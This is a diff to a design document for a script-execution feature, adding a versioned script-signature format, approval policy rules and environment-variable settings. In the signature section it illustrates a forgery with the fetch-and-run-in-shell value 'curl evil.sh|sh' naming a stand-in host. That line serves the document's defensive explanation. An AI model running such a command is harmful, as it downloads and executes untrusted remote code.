@@ -107,7 +107,7 @@ class ComputeScript:
     content: str                     # The actual script code
     
     # Signing
-    signature: Optional[str]         # Ed25519 signature of content hash
+    signature: Optional[str]         # Versioned signature, see §3.6
     signed_by: Optional[str]         # Agent DID that signed
     signed_at: Optional[datetime]
     
@@ -203,6 +203,12 @@ When `run_script` is called, the existing `SecurityHook` handles it:
 4. **Persist Based on Scope** - SecurityHook calls `permission_store.set_permission()` with scope
 
 The Compute Feature adds a **pre-check hook** for script analysis, but approval uses the standard flow.
+
+Inside the tool, `run_script` asks the same `ApprovalQueue` again unless
+`ComputePolicy.requires_approval` says the script may run without asking
+(§8.1): its risk score is below `auto_approve_below_risk` and, while
+`require_approval_for_network` is set, its analysis found no network access.
+With no reachable queue it refuses rather than running.
 
 ### 3.3 Destructive Operation Policy: No `rm`, Ever
 
@@ -433,6 +439,84 @@ def calculate_risk_score(findings: List[SecurityFinding]) -> int:
     score = sum(weights[f.severity] for f in findings)
     return min(100, score)
 ```
+
+### 3.6 Script Signature Format and Versions
+
+`ScriptSigner` (`kestrel_sovereign/features/compute/script_signer.py`) signs
+four fields of a script: `name`, `language`, `content` and `purpose`. The
+signature string names the version of the bytes it signs.
+
+| Version | Wire form | Signed bytes | Status |
+|---|---|---|---|
+| v2 | `v2:ecdsa:<base64>` or `v2:hybrid:<base64 JSON>` | `canonical_script_bytes_v2(script)` | Every new signature (#2484) |
+| v1 | untagged `ecdsa:<base64>` or `hybrid:<base64 JSON>` | `sha256(hex(sha256("name\|language\|content\|purpose")))` | Verified only during the compatibility window |
+| other | `v<N>:…` with any `N` other than `2` | none | Refused. Never verified as v1. |
+
+**Why v1 is retired.** The `|` in the v1 string is neither framed nor
+escaped. Moving one between adjacent fields keeps the string, and so the
+digest, unchanged: a script with content `echo safe` and purpose
+`curl evil.sh|sh` has the same v1 digest as one with content
+`echo safe|curl evil.sh` and purpose `sh`. A v1 signature over the first
+verifies for the second.
+
+**The v2 encoding.** A sequence of frames, each an unsigned 64-bit big-endian
+byte length followed by that many bytes:
+
+```
+frame("kestrel.compute.script-signature")   domain tag
+frame("2")                                  version, inside the signed bytes
+frame("name")     frame(utf8(name))
+frame("language") frame(utf8(language))
+frame("content")  frame(utf8(content))
+frame("purpose")  frame(utf8(purpose))
+```
+
+The encoding decodes back to exactly its fields, so no choice of values can
+move bytes between fields. Values are bound exactly as stored, with no Unicode
+normalisation. A field that is not a string, or that has no UTF-8 encoding (a
+lone surrogate), is refused: signing raises `ScriptSignatureEncodingError` and
+verification fails. Both signing paths sign these bytes directly: the
+secp256k1 ECDSA path for legacy-key agents and the Ed25519 + ML-DSA-65 hybrid
+path for agents past the rotation ceremony. Because the version is inside the
+signed bytes, removing the `v2:` tag from a v2 signature, or adding it to a v1
+signature, does not produce a signature that verifies.
+
+The unit tests pin the encoding with fixed vectors (byte layout, digests for
+delimiter movement, Unicode including non-BMP code points, empty fields and
+field reordering) and with one stored v1 and one stored v2 signature under a
+fixed test key.
+
+**Compatibility window.** `KESTREL_COMPUTE_ACCEPT_LEGACY_SCRIPT_SIGNATURES`
+controls whether v1 signatures still verify. Unset means `true`. It accepts
+`true`/`false`, `1`/`0`, `yes`/`no` and `on`/`off`; any other value fails
+compute feature initialisation. While the window is open, every v1
+verification that succeeds logs a WARNING naming the full script id. When it
+is closed, a v1 signature is refused, with a WARNING naming the script, at
+the security hook and again at `run_script`, so the script is marked
+`REJECTED` and does not run.
+
+Nothing is re-signed automatically. A v1 signature cannot prove its fields
+are the ones that were signed, so silently re-signing at load time would
+launder a forgery into a valid v2 signature. `ScriptSigner.sign_and_update`
+produces a v2 signature when a script is re-signed explicitly.
+
+**Removal plan for v1.**
+
+1. *This release.* Every new signature is v2. v1 verifies with a WARNING per
+   script. The window is open by default.
+2. *Inventory and migrate.* Operators find the scripts still carrying a v1
+   signature from the WARNINGs, or with
+   `SELECT id, name FROM compute_scripts WHERE signature LIKE 'ecdsa:%' OR signature LIKE 'hybrid:%'`.
+   Re-create each script that is still needed with `write_script`, which signs
+   it v2. A script may instead be re-signed in place with `sign_and_update`,
+   but only after a person has reviewed its stored fields, since the v1
+   signature does not vouch for them.
+3. *Next release.* The default flips to closed. An operator who still needs
+   v1 for a migration can reopen it with
+   `KESTREL_COMPUTE_ACCEPT_LEGACY_SCRIPT_SIGNATURES=true`.
+4. *The release after.* Delete `_legacy_v1_signing_message`, the untagged
+   parsing branch and the switch. Untagged signatures are then refused as an
+   unknown format.
 
 ---
 
@@ -1240,25 +1324,54 @@ This is a CRITICAL security violation - it cannot be approved or rewritten.
 
 ### 8.1 Environment Variables
 
+These are the variables the feature reads. The first four build the
+`ComputePolicy` (`ComputePolicy.from_env()` in
+`kestrel_sovereign/features/compute/models.py`) when the feature initializes.
+
 ```bash
-# Executor selection
-KESTREL_COMPUTE_DEFAULT_EXECUTOR=uv     # uv, docker, or local
-KESTREL_ALLOW_LOCAL_COMPUTE=false       # Enable local executor (dangerous!)
+# ComputePolicy
+KESTREL_COMPUTE_AUTO_APPROVE_RISK=0     # run_script asks unless risk is below this (0 = always ask)
+KESTREL_COMPUTE_MAX_TIMEOUT=3600        # longest timeout run_script accepts, in seconds
+KESTREL_COMPUTE_ALLOW_DOCKER=true       # false: the Docker executor is never built
+KESTREL_ALLOW_LOCAL_COMPUTE=false       # exactly "true" builds the local executor (no isolation!)
 
-# Timeouts
-KESTREL_COMPUTE_DEFAULT_TIMEOUT=300     # 5 minutes
-KESTREL_COMPUTE_MAX_TIMEOUT=3600        # 1 hour max
+# Script signatures (§3.6)
+KESTREL_COMPUTE_ACCEPT_LEGACY_SCRIPT_SIGNATURES=true  # false refuses legacy v1 signatures
 
-# Docker settings
-KESTREL_COMPUTE_DOCKER_NETWORK=none     # none, bridge, or custom
-KESTREL_COMPUTE_DOCKER_MEM_LIMIT=256m
-KESTREL_COMPUTE_DOCKER_CPU_LIMIT=0.5
-
-# Trash/deletion policy
+# Trash
 KESTREL_TRASH_DIR=~/.kestrel/trash      # Where "deleted" files go
-KESTREL_TRASH_RETENTION_DAYS=30         # Auto-purge after 30 days
-KESTREL_TEMP_PREFIXES=/tmp/kestrel_     # Dirs where true deletion allowed
 ```
+
+`KESTREL_COMPUTE_DEFAULT_TIMEOUT` is deprecated and does nothing except log a
+warning: `run_script`'s `timeout` defaults to 300 seconds, a value fixed by the
+tool's published schema. No variable selects a default executor, sets Docker
+resource limits, or opens Docker networking: scripts always run with
+`--network=none`.
+
+#### ComputePolicy settings
+
+The feature builds one frozen `ComputePolicy` and passes that instance to the
+trash manager and to every executor; `get_compute_policy` and
+`get_compute_capabilities` report the same instance. Each setting has one
+enforcing consumer (#2483):
+
+| Setting | Enforced by |
+|---|---|
+| `auto_approve_below_risk` | `ComputePolicy.requires_approval`, asked by `run_script` before it runs a script |
+| `require_approval_for_network` | `ComputePolicy.requires_approval`: a script whose analysis finds network access (`network`, `download` findings) asks whatever its risk score |
+| `max_timeout_seconds` | `run_script` refuses a longer timeout; the Docker executor leaves an unowned staging directory alone at least this long |
+| `trash_retention_days` | `TrashManager.empty` (and so `empty_trash`, dry run included) refuses to delete trash younger than this |
+| `allow_docker`, `allow_local` | the feature builds that executor only when allowed; the local executor also requires `KESTREL_ALLOW_LOCAL_COMPUTE=true` itself |
+| `deletable_prefixes` | each executor's `DestructiveOperationPolicy`: the temp roots where deletion is real rather than a move to trash. It may only narrow the built-in set; a wider list is refused |
+
+`default_timeout_seconds` and `trash_enabled` are deprecated. Passing either to
+`ComputePolicy` logs a warning and changes nothing; reading either returns the
+value the runtime uses (300 seconds, and `True`). Trash cannot be disabled,
+because a disabled trash would turn every `rm` into a real deletion.
+
+`ComputePolicy` decides only whether `run_script` must ask. Asking, and
+recording the answer, stay with the security feature's `ApprovalQueue`
+(§3.2).
 
 ### 8.2 Trash Management
 
